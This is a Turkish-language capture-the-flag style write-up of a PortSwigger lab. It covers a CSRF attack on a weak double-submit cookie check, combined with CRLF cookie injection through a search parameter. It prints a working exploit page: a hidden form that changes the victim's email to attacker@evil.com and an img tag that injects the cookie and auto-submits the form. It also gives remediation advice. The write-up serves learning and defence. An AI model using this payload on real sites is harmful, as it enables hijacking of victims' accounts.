# CSRF Where Token Is Duplicated in Cookie — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-06

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Zor (Expert)
- **Tespit Edilen Zafiyet:** CSRF — token form parametresi ile aynı isimli bir cookie'de kopyalanıyor (double-submit), sunucu sadece ikisinin eşit olup olmadığına bakıyor; + arama fonksiyonunda CRLF/cookie injection
- **Genel Etki:** Saldırgan uydurma bir token değerini hem forma hem cookie'ye koyarak e-posta değiştirme CSRF'i gerçekleştirebilir
- **Durum:** Tamamlandı — iki aşamalı exploit (cookie injection + form submit) teslim edildi, lab çözüldü

---

## Vulnerability Analysis

- **Zafiyet:** Token "double submit cookie" ile doğrulanıyor ama zayıf: sunucu form'daki `csrf` parametresi ile `csrf` cookie'sinin **eşit olup olmadığına** bakıyor, token'ın geçerliliğini/oturum bağını kontrol etmiyor.
- **Sonuç:** Saldırgan **herhangi bir değeri** (ör. `fake`) hem forma hem cookie'ye koyarsa, ikisi eşit olur → kabul. Geçerli token gerekmez.
- **Ek gereksinim:** Cookie'yi kurbanın tarayıcısına set edebilmek için bir **cookie injection** vektörü (arama fonksiyonu + CRLF).

---

## Exploitation

### 1. Cookie injection noktası
Arama fonksiyonu, arama terimini bir cookie'ye yansıtıyor:
```
GET /?search=merhaba  →  Set-Cookie: LastSearchTerm=merhaba
```
CRLF (`%0d%0a`) ile header bölünüp ikinci bir `Set-Cookie: csrf=fake` enjekte edilebiliyor.

### 2. Exploit

```html
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://<lab-id>.web-security-academy.net/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

Akış:
1. `<img>` search URL'ine GET atar → CRLF injection ile `Set-Cookie: csrf=fake` → kurbanın tarayıcısına `csrf=fake` cookie'si kurulur
2. img yüklenemez (HTML döner) → `onerror` → form submit
3. Form POST eder: `csrf=fake` (param) + `csrf=fake` (cookie, otomatik) → sunucu ikisini eşit görür → kabul → kurbanın e-postası değişir

### 3. Teslimat
Exploit server → Store → View exploit (test) → Deliver to victim → lab çözüldü.

---

## Remediation

- **Gerçek token doğrulaması:** Sadece "param == cookie" yetmez; token sunucu tarafında üretilmiş, geçerli ve oturuma bağlı olmalı.
- **CRLF injection engelleme:** Kullanıcı girdisi Set-Cookie'ye yazılmadan önce `\r\n` strip/encode edilmeli.
- **HttpOnly + SameSite:** Cookie'lerin cross-site manipülasyonunu zorlaştırır.

---

## Gotchas (Dikkat Edilecekler)

- **Cookie adı = form parametresi adı (`csrf`), `csrfKey` DEĞİL.** "Duplicated" demek, token aynı isimli bir cookie'de kopyalanıyor. `csrfKey` önceki lab'ın (tied to non-session cookie) adıydı — karıştırma.
- **EN BÜYÜK TUZAK — eski versiyonu kopyalayıp modifiye etmek.** Bu lab'da takılmanın tek sebebi, önceki lab'ın exploit'inden `csrfKey` adının taşınmasıydı. Her yeni lab'da exploit'i sıfırdan yaz ya da eski değerleri tek tek değiştir; "üzerine yazınca" göz artık o satırları okumuyor.
- **Değer herhangi bir şey olabilir** (`fake`) — yeter ki form ve cookie'de **aynı** olsun. Geçerli token gerekmez (sunucu geçerliliği kontrol etmiyor, sadece eşitliği).
- **Cookie injection ŞART.** Bu lab img olmadan çözülmez — cookie'yi set etmenin tek yolu o. Form tek başına yetmez.
- **"Invalid csrf token" = form ≠ cookie.** Cookie injection tutmazsa (yanlış isim/CRLF çalışmıyor), form değeri gerçek cookie ile eşleşmez → invalid. Bu hata, cookie injection'ın başarısız olduğunun işaretidir.
- **Access log saati UTC** — yerel saatinle uyuşmaması "kayıt yok" demek değil (bu oturumda iki kez yanılttı).
- **img etiketini kapat (`>`), domain tam olsun (`.web-security-academy.net`).**
